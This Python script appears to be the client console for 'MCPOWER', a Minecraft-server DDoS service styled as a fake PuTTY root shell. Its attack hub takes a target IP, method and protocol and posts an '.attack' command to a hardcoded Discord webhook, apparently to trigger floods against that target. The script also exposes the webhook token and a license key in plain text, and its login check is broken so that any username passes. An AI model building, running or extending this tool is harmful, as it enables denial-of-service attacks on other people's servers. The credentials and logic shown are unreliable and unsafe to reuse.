from asyncio import protocols
import sys
import os
import time
from datetime import datetime
from xmlrpc.client import ProtocolError
import colorama
from colorama import *
from pypresence import Presence
from discord_webhook import DiscordWebhook
import json
import urllib.request
import requests
from datetime import datetime

now = datetime.now()

red, lred, black, lblack, white, green, lgreen, cyan, lcyan, magenta, lmagenta, yellow, lyellow, blue, lblue, reset = Fore.RED, Fore.LIGHTRED_EX, Fore.BLACK, Fore.LIGHTBLACK_EX, Fore.WHITE, Fore.GREEN, Fore.LIGHTGREEN_EX, Fore.CYAN, Fore.LIGHTCYAN_EX, Fore.MAGENTA, Fore.LIGHTMAGENTA_EX, Fore.YELLOW, Fore.LIGHTYELLOW_EX, Fore.BLUE, Fore.LIGHTBLUE_EX, Fore.RESET

banner = """ 

███╗   ███╗ ██████╗██████╗  ██████╗ ██╗    ██╗███████╗██████╗ 
████╗ ████║██╔════╝██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗      Website: Luch.WTF
██╔████╔██║██║     ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝      Discord: dsc.gg/MCPOWER
██║╚██╔╝██║██║     ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗      Version: 1.0
██║ ╚═╝ ██║╚██████╗██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║
╚═╝     ╚═╝ ╚═════╝╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝
                                                              
"""


client_id = '1012334765673820191'  # Fake ID, put your real one here
RPC = Presence(client_id)  # Initialize the client class
RPC.connect() # Start the handshake loop
kokotizmus=""
rank=""

def Startup():
    current_time = now.strftime("%H:%M:%S")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: Using NullPing_ Core")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: Starting console addons")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: Starting a server")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: Listening to 0.0.0.0:2447")
    time.sleep(2)
    debil()

def login():
    u = input("login as: ")
    kokotizmus=u
    if u == "Snobycek" or "NullPing_" or "MiniFlex" or "AndyxBTW":
        p = input("root@MCPOWER's password:" + Fore.BLACK + " ")
        if p == "root":
            os.system("cls")
            print(Fore.RED + banner)
            print(Fore.WHITE + "")
            os.system("title attack@MCPOWER: ~")
            if kokotizmus == "NullPing_":
                rank="ADMIN"
            elif kokotizmus == "MiniFlex":
                rank="ADMIN"
            elif kokotizmus == "AndyxBTW":
                rank = "OWNER"
            else:
                rank = "MEMBER"
            license = input("Lincese Key: ")
            if license == "#&7ef8ZJYhIME4bZHV32yglwLoDReQEDWWR$fniU0W8ZYjjtQ3":
                RPC.update(state=f"User: {kokotizmus}", details=f"Rank: {rank}", large_image="mcpower", small_image=" ", large_text="Developed by NullPing_")
                os.system("cls")
                Startup()


def debil():
    os.system("cls")
    print(Fore.RED + banner)
    print(Fore.WHITE + "")
    sin = input("[root@MCPOWER] ~ # ").lower()
    sinput = sin.split(" ")[0]

    if sinput == "help":
        print("Select a help menu: attack,resolver ")
        help = input("Select: ")
        if help == "attack":
            print("Attack usage: attack ip port method protocol ")
            debil()

    if sinput == "attack":
        attackhub()

    if sinput == "clear":
        os.system("cls")
        debil()

    if sinput == "bungeecord":
        Bungeecord()

    if sinput == "stop":
        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1038488939390062602/zqsN2uhhbea_bNcHEz1FFJdG1MgGyNvf4YdqSuF4_IIvC7fzi2JwHg1Hob8XDHG6G6f7', rate_limit_retry=True,
            content=f'.stop')
        response = webhook.execute()
        debil()

    if sinput == "resolver":
        ip3 =  input("IP: ")
        url = "https://api.mcsrvstat.us/2/" + ip3
        file = urllib.request.urlopen(url)

        for line in file:
            decoded_line = line.decode("utf-8")

        json_object = json.loads(decoded_line)

        print(f"{json_object}")
        time.sleep(6)
        debil()

    if sinput == "authors":
        print("Console Author:\n\nLooph - OWNER\nBrutalCODE - API\n")
        debil()
        
    else:
        print("/etc/bash: "+ sinput +": command not found")
        debil()

def Bungeecord():
    current_time = now.strftime("%H:%M:%S")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: Using NullPing_ Core")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: Starting console addons")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: Starting plugins")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: Starting Debilni keci")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: Starting yourmom.exe")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: starting backdoor.jar")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: started hoswfloe EZZEZEZ")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: KURVA uz nevim co psat")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: Starting a server")
    time.sleep(0.5)
    print(f"[{current_time} INFO]: Listening to 0.0.0.0:2447")
    time.sleep(2)
    debil()

def attackhub():
    os.system("cls")
    print(Fore.RED + banner)
    print(Fore.WHITE + "")
    print(Fore.LIGHTGREEN_EX + "                            Welcome to Attack HUB")
    print(Fore.WHITE + "                                Usage: start")
    print("")
    start2 = input("[root@MCPOWER] ~ # ")
    if start2 == "start":
        start4()

def start4():
    current_time = now.strftime("%H:%M:%S")
    os.system("cls")
    print(Fore.RED + banner)
    print(Fore.WHITE + "")
    print(Fore.LIGHTGREEN_EX + "                            Welcome to Attacking hub")
    print(Fore.WHITE + "")
    ip = input("ip: ")
    method = input("method: ")
    protocol = input("protocol: ")
    os.system("cls")
    time.sleep(0.5)
    print(reset + f"[{current_time} INFO]: Connecting to " + blue + "attack servers")
    time.sleep(1)
    print(reset + f"[{current_time} INFO]: Connected to " + Fore.LIGHTGREEN_EX + "attack servers")
    time.sleep(1)
    print(reset + f"[{current_time} INFO]: Attack Threads: " + green + "2")
    time.sleep(1)
    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1038488939390062602/zqsN2uhhbea_bNcHEz1FFJdG1MgGyNvf4YdqSuF4_IIvC7fzi2JwHg1Hob8XDHG6G6f7', rate_limit_retry=True,
                         content=f'.attack {ip} {protocol} {method} premium')
    response = webhook.execute()
    os.system("cls")
    print(Fore.RED + banner)
    print(Fore.WHITE + "")
    print(f"ip: {ip}")
    print(f"method: {method}")
    print(f"method: {protocol}")
    print("")
    print ("- api by Nullping_")
    print(f"[{current_time} INFO]: "+ green +"Attacked has been started! "+ blue +f" ({ip})")
    time.sleep(5)
    debil()

os.system("title PuTTY (inactive)")
os.system("cls")
login()


